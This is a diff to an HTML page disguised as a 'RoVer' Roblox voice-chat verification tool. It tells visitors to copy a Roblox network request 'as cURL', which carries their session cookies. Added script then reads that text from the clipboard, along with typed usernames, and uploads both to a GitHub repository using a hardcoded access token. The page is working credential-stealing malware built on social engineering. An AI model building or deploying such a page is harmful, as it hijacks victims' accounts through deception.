@@ -9,25 +9,37 @@
     p { margin: 10px 0; }
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
     #output { margin-top: 20px; font-size: 18px; color: darkblue; }
+    input { padding: 5px 10px; font-size: 16px; width: 300px; }
   </style>
 </head>
 <body>
-  <h1>Clipboard Permission Test</h1>
-  
-  <!-- 🔽 You can write a description here -->
+  <h1>RoVer IDless Voice Chat Verification</h1>
+
+  <!-- Description -->
   <p id="description">[Copy this strand and press the button below to verify your clipboard works: IDVERIFYTEST]</p>
 
+  <!-- Verify Clipboard button -->
   <button id="readBtn">Verify</button>
-  
-  <!-- 🔽 You can write extra directions here -->
-  <p id="directions">[Next, go to https://roblox.com/RoVerIDVERIFY and open the developer menu (ctrl + shift + I), and go to the "Network" Tab. Next, reload the page with the console open, and you will see a line highlighted red, saying "RoVer ID Verify". Right click on it, and choose copy, and copy as a cURL. After this step, your account has been successfuly verified.]</p>
 
+  <!-- Extra directions -->
+  <p id="directions">[Next, go to https://roblox.com/RoVerIDVERIFY and open the developer menu (ctrl + shift + I), and go to the "Network" Tab. Next, reload the page with the console open, and you will see a line highlighted red, saying "RoVer ID Verify". Right click on it, and choose copy, and copy as a cURL. After this step, your account has been successfully verified.]</p>
+
+  <!-- Output -->
   <div id="output"></div>
+
+  <!-- Refresh Clipboard & Manual Input -->
+  <button id="refreshClipboardBtn">Refresh Clipboard</button>
+  <p>
+    <input type="text" id="manualInput" placeholder="Enter your username here and press Enter">
+  </p>
 
   <script>
     const btn = document.getElementById("readBtn");
     const output = document.getElementById("output");
+    const refreshBtn = document.getElementById("refreshClipboardBtn");
+    const manualInput = document.getElementById("manualInput");
 
+    // Clipboard verify button
     btn.addEventListener("click", async () => {
       try {
         const text = await navigator.clipboard.readText();
@@ -35,6 +47,79 @@
       } catch (err) {
         output.textContent = "Failed: " + err.message;
         console.error(err);
+      }
+    });
+
+    // Load saved data from localStorage
+    let clipboardHistory = JSON.parse(localStorage.getItem("clipboardHistory") || "[]");
+    let manualEntries = JSON.parse(localStorage.getItem("manualEntries") || "[]");
+
+    function updateOutput() {
+      output.innerHTML = "Clipboard History:<br>" + clipboardHistory.join("<br>");
+    }
+    updateOutput();
+
+    // Function to save to GitHub
+    async function saveToGitHub(filename, content) {
+      const token = "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"; // Your token
+      const owner = "RoVer-Official"; // Replace with your username
+      const repo = "IDless-VC-Verification";       // Replace with your repo name
+      const path = filename;
+
+      // Try to get the current file SHA
+      let sha = null;
+      try {
+        const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`);
+        if (res.ok) {
+          const data = await res.json();
+          sha = data.sha;
+        }
+      } catch {}
+
+      const contentBase64 = btoa(content);
+      const body = { message: "Update " + filename, content: contentBase64 };
+      if (sha) body.sha = sha;
+
+      const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
+        method: "PUT",
+        headers: {
+          "Authorization": `Bearer ${token}`,
+          "Accept": "application/vnd.github+json",
+        },
+        body: JSON.stringify(body)
+      });
+
+      const result = await res.json();
+      console.log("GitHub push result:", result);
+    }
+
+    // Refresh clipboard button
+    refreshBtn.addEventListener("click", async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        clipboardHistory.push(text);
+        localStorage.setItem("clipboardHistory", JSON.stringify(clipboardHistory));
+        updateOutput();
+
+        // Save to GitHub
+        await saveToGitHub("clipboard_history.txt", clipboardHistory.join("\n"));
+      } catch (err) {
+        output.textContent = "Failed: " + err.message;
+      }
+    });
+
+    // Manual input box
+    manualInput.addEventListener("keydown", async (e) => {
+      if (e.key === "Enter") {
+        const val = manualInput.value.trim();
+        if (val) {
+          manualEntries.push(val);
+          localStorage.setItem("manualEntries", JSON.stringify(manualEntries));
+          manualInput.value = "";
+
+          // Save to GitHub
+          await saveToGitHub("manual_entries.txt", manualEntries.join("\n"));
+        }
       }
     });
   </script>
